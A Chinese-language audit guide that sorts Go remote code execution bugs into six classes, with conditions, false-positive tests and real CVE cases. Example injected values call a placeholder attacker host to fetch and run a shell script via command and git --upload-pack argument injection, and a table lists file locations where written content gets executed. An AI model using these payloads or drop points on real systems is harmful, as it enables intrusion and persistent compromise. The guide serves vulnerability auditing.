# 六相：Go RCE 的六种形状

Go 内存安全，没有反序列化 gadget 链。所有 RCE 都归到这六相之一，每一相有**不同的证伪测试**。混用判据是本领域最大的误报来源。

---

## E1 命令拼接（shell 参与解析）

**成立条件**：一个真正的 shell（`sh`/`bash`/`cmd`/`powershell`）解析了含攻击者数据的字符串。

```go
// 成立
exec.Command("sh", "-c", "tar -czf /tmp/out.tgz "+dir)
// dir = "x; curl http://attacker/s | sh"

exec.CommandContext(ctx, "bash", "-c", fmt.Sprintf("ping -c 2 %s", host))
// host = "127.0.0.1; id > /tmp/poc"
```

**不成立**（常见误报）：

```go
exec.Command("cat", "/reports/"+name)   // 无 shell。这是路径穿越，不是 E1
exec.Command("git", "log", branch)      // 无 shell
// 官方文档明确：os/exec 的设计目的就是不经过 shell
```

**Windows 特例**：`cmd /c` 与 `powershell -Command` 即使把用户串作为**独立 argv** 传入，仍会二次解析。PowerShell 还会解释字符串内的 `$()`：

```go
exec.Command("cmd", "/c", "mklink", link, target)  // target 里的 & 仍会执行
// kubelet CVE-2023-3676 正是这个形状：subPath 未净化 → SYSTEM 权限 RCE
// 官方修法不是转义，而是删掉 cmd 调用、改用原生 Go 符号链接函数
```

**不会命中的写法**（写测试时用作负样本）：

```go
exec.Command("sh", "-c", `grep "$1" f`, "sh", userValue)  // 位置参数，不参与解析
exec.Command("sh", "-c", "ls "+shellescape.Quote(dir))    // 已转义
```

**Payload 必须证明的字符**：空格 / `;` / `|` / `&` / `` ` `` / `$()` / 换行。任一被过滤即证伪。

**变体清单**：`os.StartProcess`（argv 拼接）、`syscall.Exec`、`sh -c` 藏在变量里（`shellVar := "sh"`）、`exec.Command("/bin/sh", ...)`、`fmt.Sprintf("...%s", user)` 后再传。

---

## E2 模板求值

**成立条件（二者之一）**：

1. 模板**文本**可控（不是数据可控）→ 可写入 `{{ }}` 动作
2. 模板文本固定，但 `FuncMap` 暴露了执行/文件类函数

```go
// 成立 A：模板文本来自请求
tpl := r.FormValue("tpl")
template.New("x").Parse(tpl)   // {{ . }} / {{ call .F "id" }}

// 成立 B：门在 FuncMap
t.Funcs(template.FuncMap{
    "run": func(c string) string { out, _ := exec.Command("sh", "-c", c).CombinedOutput(); return string(out) },
})
// 模板里 {{ run "id" }} 即 RCE，哪怕模板文件是仓库里写死的
```

**关键判据**：`.Parse(userStr)` 单独**不够**。必须问：能调到哪个函数？
- `text/template` 可调对象方法 `{{.Method "arg"}}`，也可 `{{call .Fn "arg"}}`
- `html/template` 同样能调方法，只是输出会转义
- FuncMap 为空 + 模板文本可控 → 基本只能读数据（`{{.Password}}`）、DoS（深递归），不是 RCE

**高危 FuncMap 键名**（不是靠名字判，靠实现判）：`exec`/`run`/`sh`/`cmd`/`system`/`popen`/`readfile`/`writefile`/`env`/`expandenv`。

**sprig**：`sprig.TxtFuncMap()` 含 `env`、`expandenv`、`getHostByName`。本身不执行命令，但配合 `tpl` 式递归求值或后续利用可放大。Helm 的 `tpl` 函数是典型放大器：模板里再渲染模板。

**Go 特有**：
- 模板**文件**从可写目录加载（`ParseFiles(dir + "/" + name)`）→ 变 E4（写模板 = 写代码）
- `tmpl.Execute` 时传入的对象若有 `func` 字段，`{{call}}` 可直接调用
- 错误信息会泄漏类型/包路径，是侦察面不是 RCE

**证伪**：模板字面量 + FuncMap 里只有 `upper`/`printf` 这类纯函数 → 删掉这条候选。

---

## E3 反序列化（Go 里最容易判断错的一相）

**核心纠正**：`gob`/`json`/`yaml` 解码**本身不执行代码**。Go 没有 `__reduce__`、没有 `ObjectInputStream`、没有可自动触发的 setter。

所以 E3 的成立条件不是"解码了不可信数据"，而是：

> **解码结果被用作命令、路径、权限或加载目标。**

```go
// 不是 RCE（只是 DoS）
gob.NewDecoder(r.Body).Decode(&job)   // 可致巨额预分配 / 栈溢出

// 是 RCE 的中间站（提权）
sess, _ := store.Get(r, "session")    // gob 解码 cookie
if sess.Values["admin"] == true { ... }  // 伪造 identity → 管理员

// 是 RCE 的中间站（后续进 E1/E4）
cfg := decodeYAML(r.Body)
exec.Command("sh", "-c", cfg.PostInstall)   // 终点在 E1
```

**真实案例的正确叙事**（Gogs/Gitea CVE-2018-18925/18926）：session 反序列化导致**普通用户被伪造成管理员**，然后利用管理员才有的 **git hooks 编辑功能**写入命令 → 执行。写这条链时若说"gob 反序列化导致 RCE"就是把 3 跳压成 1 跳，评审一读源码就会发现你在编。

**gob 的真实风险**：
- 长度前缀驱动的预分配 → 内存耗尽（一个请求打挂进程）
- `gob.Register` 注册的类型被实例化 → 类型混淆
- 自定义 `GobDecode`/`UnmarshalJSON` 方法**内部有副作用**（写文件、执行）→ 这时才是直连 RCE，极罕见，但值得 grep

**cookie/session 专项**：
- `securecookie` 的 key 硬编码在仓库里 → 可伪造
- `sessions.NewCookieStore([]byte("secret"))` → 同上
- `HttpOnly=false` 只影响窃取，不影响伪造

**证伪**：解码后只做数值比较、只写日志、只存数据库 → 不是 E3。

---

## E4 写到哪里就会被执行（Go 生态最主流的一相）

这一相 **grep `exec` 完全找不到**，却是近年 Go 项目 RCE 的主要形态。

**成立条件（四个都必须有）**：

1. 写入路径可控，或落在一个固定会被执行的位置
2. 写入内容可控
3. 权限位允许执行（或目标位置不需要 x 位，如 cron/配置）
4. **存在下游执行者 + 可触发的时机**

第 4 条是可证伪的关键。没有下游执行者，就只是任意文件写入。

| 落点 | 下游执行者 | 触发 |
|------|-----------|------|
| `.git/hooks/post-*` | git 自己 | 下一次 `git commit/merge/checkout` |
| `/etc/cron.d/*`、用户 crontab | cron | 下一分钟 |
| `~/.ssh/authorized_keys` | sshd | 下次登录 |
| `~/.bashrc`、`.profile` | 登录 shell | 下次交互登录 |
| `/etc/systemd/system/*.service` | systemd | enable/start 或重启 |
| 插件目录 + `plugin.Open` | 应用自己 | 下次加载 |
| 模板目录（热加载） | 应用自己 | 下次渲染 |
| `.github/workflows/*.yml` | GitHub Actions | 下次 push（供应链） |
| `go.mod` 的 `replace` 指令 | `go build` | 下次构建（供应链） |
| `/etc/ld.so.preload` | 动态链接器 | 下次启动任意进程 |

**Gitea CVE-2026-60004**（已在野利用，KEV）是教科书级 E4：
- 入口：`diffpatch` 端点，任意注册用户可用
- 机制：同一份 patch 提交两次 → git 三方合并产生 add 冲突 → 文件被直接写到磁盘
- 关键：bare clone 的仓库根**就是** `$GIT_DIR`，所以 `hooks/post-index-change` 落进活的 hook 目录
- 下游：git 下次触碰 index 时执行，身份是 Gitea 服务账号

注意这个链条里**没有一行 `exec.Command`**。只 grep exec 的审计会完全漏掉。

**变体**：Zip Slip（解压时 `filepath.Join` 未校验 `..`）落到上述任一目录；符号链接攻击（先写 symlink 再写目标）；`os.Rename` 覆盖已有二进制。

**证伪**：路径由 `filepath.Join(fixedDir, "..", userInput)` 之后没有 `strings.HasPrefix(clean, fixedDir)` → 反向，说明可逃逸；若做了前缀校验且 `fixedDir` 不在可执行位置 → 降级为任意文件写，不是 RCE。

---

## E5 参数注入（Go 里"没有 shell"不等于安全）

**成立条件**：攻击者控制的一个 argv token **以 `-` 开头**，且该程序有危险选项。

```go
exec.Command("git", "clone", userURL)              // 无 shell
// userURL = "--upload-pack=curl http://attacker/x|sh"
// git 会执行 upload-pack 指定的命令 → RCE

exec.Command("tar", "-xf", userArchive)            // tar 的 -I/--to-command
exec.Command("ssh", userHost, "id")                // -oProxyCommand=
exec.Command("find", dir, "-exec", ...)
exec.Command("rsync", "-e", userShell, src, dst)
```

**与 E1 的分界**：E1 是"字符串变成命令行"，E5 是"一个参数变成选项"。判据不同：E5 要看**参数位置**——拼在字面量前缀后面的（`"/reports/"+name`）不会变成选项，因此**不是** E5。

**真实案例**：Gitea CVE-2026-73539 —— external renderer 命令模板里的 Context 未转义，可注入额外 renderer 参数（`--filter` 之类），配合可放置的 filter 文件 → 以服务账号执行。CWE-88（参数注入），不是 CWE-78。

**防护形态**：显式 `--` 分隔符（`exec.Command("git", "clone", "--", url)`）、白名单校验、URL scheme 校验、`shellescape`（只对 E1 有意义）。

**证伪**：参数列表全是常量；或用户数据只出现在最后一个位置参数且该程序无危险末位选项。

---

## E6 动态加载

**成立条件**：加载目标可控，且加载物已落盘（所以常与 E4 组合）。

```go
plugin.Open(userPath)                     // Go plugin，Linux + CGO，符号必须匹配
syscall.Exec(binPath, argv, env)          // 直接 execve，绕过 os/exec 语义
db.Exec("INSTALL EXTENSION ..."); db.Exec("LOAD shellfs")   // 数据库扩展
```

**Grafana CVE-2024-9264** 是这一相的现代样本：DuckDB SQL 表达式 → `LOAD shellfs` 扩展 → `read_csv('id > /tmp/x |')` 的管道语法把内容当 shell 命令执行。表面上写的是 "SQL 注入"，实际上是**扩展加载 + 解释器内建命令执行**，归 E6 比归 "SQLi" 更接近本质（这也是为什么补丁是把整个 SQL Expressions 功能删掉）。

**嵌入式解释器**：`goja`/`otto`/`starlark`/`cel` 暴露给用户时，沙箱质量决定一切。默认配置下 goja 无文件/进程访问，但宿主注册的 Go 函数就是逃逸门——等同于 E2 的 FuncMap 审计方法。

**证伪**：加载路径是常量、加载物不可写、plugin 符号名固定且不调用外部输入。

---

## 相与相的组合（真实漏洞几乎都是链）

```
E3 解码 → 伪造身份/权限      → E4 写 hook  → 执行     (Gogs/Gitea 2018)
E3 解码 → 拿到可控配置字段   → E1 拼命令   → 执行
E4 落盘 → E6 加载            → 执行        (插件类)
E5 参数注入 → 外部程序代执行 → 执行        (git/pandoc 类)
E2 FuncMap → 直接执行        → 执行        (SSTI 类)
```

写报告时把链**一跳一跳**列出来，每跳带 `path:line`。压缩跳数是最常见的失信行为。
